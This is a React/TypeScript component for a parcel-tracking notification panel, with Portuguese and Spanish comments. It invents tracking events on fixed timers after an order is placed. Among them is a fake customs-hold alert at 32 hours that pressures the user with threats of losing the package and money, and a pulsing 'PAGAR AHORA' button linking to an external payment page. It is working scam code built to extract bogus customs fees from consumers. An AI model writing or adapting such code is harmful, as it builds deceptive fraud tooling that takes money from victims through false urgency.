'use client'

import { useState, useEffect } from 'react'
import { Bell, X, CheckCircle, AlertTriangle, Clock, Package } from 'lucide-react'

interface Notification {
  id: string
  type: 'update' | 'retention' | 'payment' | 'delivery'
  title: string
  message: string
  timestamp: string
  read: boolean
  trackingCode?: string
}

export default function AutomaticNotificationSystem() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [showNotifications, setShowNotifications] = useState(false)
  const [unreadCount, setUnreadCount] = useState(0)

  // Função para atualizar histórico de rastreio
  const updateTrackingHistory = (newNotifications: Notification[]) => {
    const trackingHistory = newNotifications.map(notification => ({
      id: notification.id,
      status: notification.title,
      description: notification.message,
      timestamp: notification.timestamp,
      location: notification.type === 'retention' ? 'Aduana Internacional' : 
                notification.type === 'delivery' ? 'Centro de Distribuição' : 'Em Trânsito',
      trackingCode: notification.trackingCode
    }))
    
    // Salvar histórico atualizado no localStorage
    localStorage.setItem('trackingHistory', JSON.stringify(trackingHistory))
  }

  useEffect(() => {
    // Simular sistema de notificações automáticas
    const userEmail = localStorage.getItem('userEmail')
    const trackingCode = localStorage.getItem('trackingCode')
    const orderCreatedAt = localStorage.getItem('orderCreatedAt')
    
    if (!userEmail || !trackingCode || !orderCreatedAt) return

    // VOLTOU AO NORMAL - Usar data real do pedido
    const createdAt = new Date(orderCreatedAt)
    const now = new Date()
    const hoursSinceCreated = (now.getTime() - createdAt.getTime()) / (1000 * 60 * 60)

    // Gerar notificações baseadas no tempo
    const generateNotifications = () => {
      const newNotifications: Notification[] = []

      // Notificação inicial (0h)
      if (hoursSinceCreated >= 0) {
        newNotifications.push({
          id: '1',
          type: 'update',
          title: 'Pedido en Análisis',
          message: 'Tu pedido está en análisis.',
          timestamp: new Date(createdAt.getTime()).toLocaleString('es-ES'),
          read: false,
          trackingCode
        })
      }

      // Notificação 4h
      if (hoursSinceCreated >= 4) {
        newNotifications.push({
          id: '2',
          type: 'update',
          title: 'Pedido Confirmado',
          message: 'Tu pedido fue confirmado.',
          timestamp: new Date(createdAt.getTime() + (4 * 60 * 60 * 1000)).toLocaleString('es-ES'),
          read: false,
          trackingCode
        })
      }

      // Notificação 8h
      if (hoursSinceCreated >= 8) {
        newNotifications.push({
          id: '3',
          type: 'update',
          title: 'Tránsito Internacional',
          message: 'Tu pedido salió para tránsito internacional.',
          timestamp: new Date(createdAt.getTime() + (8 * 60 * 60 * 1000)).toLocaleString('es-ES'),
          read: false,
          trackingCode
        })
      }

      // Notificação de retenção (32h) - NORMAL: 32 horas reais
      if (hoursSinceCreated >= 32) {
        newNotifications.push({
          id: '4',
          type: 'retention',
          title: '🚨 ATENCIÓN: Pedido RETENIDO',
          message: '¡URGENTE! Tu pedido está RETENIDO en aduana. ¡TIENES SOLO 48 HORAS! Si no pagas AHORA, perderás tu pedido y dinero. ¡ACTÚA INMEDIATAMENTE!',
          timestamp: new Date(createdAt.getTime() + (32 * 60 * 60 * 1000)).toLocaleString('es-ES'),
          read: false,
          trackingCode
        })
      }

      // Notificações subsequentes (40h, 48h, 56h, 64h, 72h)
      const subsequentUpdates = [
        { hours: 40, title: 'Análisis en Curso', message: 'El análisis de tu pedido en aduana está en curso.' },
        { hours: 48, title: 'Liberado de Aduana', message: 'Tu pedido fue liberado de aduana.' },
        { hours: 56, title: 'Camino al País', message: 'Tu pedido está camino a tu país.' },
        { hours: 64, title: 'Llegó al País', message: 'Tu pedido llegó a tu país de destino.' },
        { hours: 72, title: '¡A Punto de Llegar!', message: '¡Tu pedido está a punto de llegar!' }
      ]

      subsequentUpdates.forEach((update, index) => {
        if (hoursSinceCreated >= update.hours) {
          newNotifications.push({
            id: `${5 + index}`,
            type: update.hours === 72 ? 'delivery' : 'update',
            title: update.title,
            message: update.message,
            timestamp: new Date(createdAt.getTime() + (update.hours * 60 * 60 * 1000)).toLocaleString('es-ES'),
            read: false,
            trackingCode
          })
        }
      })

      return newNotifications.reverse() // Más recientes primeiro
    }

    const newNotifications = generateNotifications()
    setNotifications(newNotifications)
    setUnreadCount(newNotifications.filter(n => !n.read).length)
    
    // ATUALIZAR HISTÓRICO DE RASTREIO quando atualizar notificações
    updateTrackingHistory(newNotifications)

    // Simular chegada de novas notificações em tempo real
    const interval = setInterval(() => {
      const updatedNotifications = generateNotifications()
      if (updatedNotifications.length !== notifications.length) {
        setNotifications(updatedNotifications)
        setUnreadCount(updatedNotifications.filter(n => !n.read).length)
        
        // ATUALIZAR HISTÓRICO DE RASTREIO quando houver novas notificações
        updateTrackingHistory(updatedNotifications)
        
        // Mostrar notificação toast para nova atualização
        if (updatedNotifications.length > 0) {
          const latestNotification = updatedNotifications[0]
          showToast(latestNotification)
        }
      }
    }, 5000) // Verificar a cada 5 segundos

    return () => clearInterval(interval)
  }, []) // Removido dependency para forçar re-render

  const showToast = (notification: Notification) => {
    // Implementar toast notification aqui
    console.log('Nueva notificación:', notification)
  }

  const markAsRead = (id: string) => {
    setNotifications(prev => 
      prev.map(n => n.id === id ? { ...n, read: true } : n)
    )
    setUnreadCount(prev => Math.max(0, prev - 1))
  }

  const markAllAsRead = () => {
    setNotifications(prev => prev.map(n => ({ ...n, read: true })))
    setUnreadCount(0)
  }

  const handleCheckoutClick = (e: React.MouseEvent) => {
    e.preventDefault()
    e.stopPropagation()
    console.log('Redirecionando para checkout...')
    // Abrir link do checkout em nova aba
    window.open('https://global.tribopay.com.br/62ky6pzjsv', '_blank', 'noopener,noreferrer')
  }

  const getNotificationIcon = (type: Notification['type']) => {
    switch (type) {
      case 'update':
        return <Package className="w-5 h-5 text-blue-600" />
      case 'retention':
        return <AlertTriangle className="w-5 h-5 text-red-600" />
      case 'payment':
        return <CheckCircle className="w-5 h-5 text-green-600" />
      case 'delivery':
        return <CheckCircle className="w-5 h-5 text-green-600" />
      default:
        return <Bell className="w-5 h-5 text-gray-600" />
    }
  }

  const getNotificationBgColor = (type: Notification['type'], read: boolean) => {
    if (read) return 'bg-gray-50'
    
    switch (type) {
      case 'retention':
        return 'bg-red-50 border-l-4 border-red-500 animate-pulse'
      case 'delivery':
        return 'bg-green-50 border-l-4 border-green-500'
      default:
        return 'bg-blue-50 border-l-4 border-blue-500'
    }
  }

  return (
    <div className="relative">
      {/* Notification Bell */}
      <button
        onClick={() => setShowNotifications(!showNotifications)}
        className="relative p-2 text-slate-600 hover:text-slate-900 transition-colors"
      >
        <Bell className="w-6 h-6" />
        {unreadCount > 0 && (
          <span className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full w-5 h-5 flex items-center justify-center animate-pulse">
            {unreadCount > 9 ? '9+' : unreadCount}
          </span>
        )}
      </button>

      {/* Notifications Panel */}
      {showNotifications && (
        <div className="absolute right-0 top-12 w-96 bg-white rounded-xl shadow-2xl border border-slate-200 z-50 max-h-96 overflow-hidden">
          {/* Header */}
          <div className="flex items-center justify-between p-4 border-b border-slate-200">
            <h3 className="font-semibold text-slate-900">Notificaciones</h3>
            <div className="flex items-center space-x-2">
              {unreadCount > 0 && (
                <button
                  onClick={markAllAsRead}
                  className="text-xs text-blue-600 hover:text-blue-800 transition-colors"
                >
                  Marcar todas como leídas
                </button>
              )}
              <button
                onClick={() => setShowNotifications(false)}
                className="text-slate-400 hover:text-slate-600 transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
          </div>

          {/* Notifications List */}
          <div className="max-h-80 overflow-y-auto">
            {notifications.length === 0 ? (
              <div className="p-8 text-center text-slate-500">
                <Bell className="w-12 h-12 mx-auto mb-4 text-slate-300" />
                <p>Ninguna notificación aún</p>
              </div>
            ) : (
              notifications.map((notification) => (
                <div
                  key={notification.id}
                  className={`p-4 border-b border-slate-100 cursor-pointer hover:bg-slate-50 transition-colors ${getNotificationBgColor(notification.type, notification.read)}`}
                  onClick={() => markAsRead(notification.id)}
                >
                  <div className="flex items-start space-x-3">
                    <div className="flex-shrink-0 mt-1">
                      {getNotificationIcon(notification.type)}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between mb-1">
                        <h4 className={`text-sm font-semibold ${
                          notification.type === 'retention' ? 'text-red-800' : 
                          notification.read ? 'text-slate-600' : 'text-slate-900'
                        }`}>
                          {notification.title}
                        </h4>
                        {!notification.read && (
                          <div className="w-2 h-2 bg-blue-500 rounded-full flex-shrink-0"></div>
                        )}
                      </div>
                      <p className={`text-sm mb-2 ${
                        notification.type === 'retention' ? 'text-red-700 font-semibold' :
                        notification.read ? 'text-slate-500' : 'text-slate-700'
                      }`}>
                        {notification.message}
                      </p>
                      
                      {/* Botão de checkout para notificação de retenção */}
                      {notification.type === 'retention' && (
                        <div className="mt-3">
                          <a
                            href="https://global.tribopay.com.br/62ky6pzjsv"
                            target="_blank"
                            rel="noopener noreferrer"
                            onClick={handleCheckoutClick}
                            className="block w-full bg-red-600 hover:bg-red-700 active:bg-red-800 text-white font-bold py-3 px-4 rounded-lg transition-all duration-200 animate-pulse hover:animate-none hover:scale-105 active:scale-95 cursor-pointer shadow-lg hover:shadow-xl text-center"
                          >
                            ¡PAGAR AHORA!
                          </a>
                        </div>
                      )}
                      
                      <div className="flex items-center justify-between mt-2">
                        <span className="text-xs text-slate-400 flex items-center">
                          <Clock className="w-3 h-3 mr-1" />
                          {notification.timestamp}
                        </span>
                        {notification.trackingCode && (
                          <span className="text-xs text-slate-500 font-mono">
                            {notification.trackingCode}
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      )}
    </div>
  )
}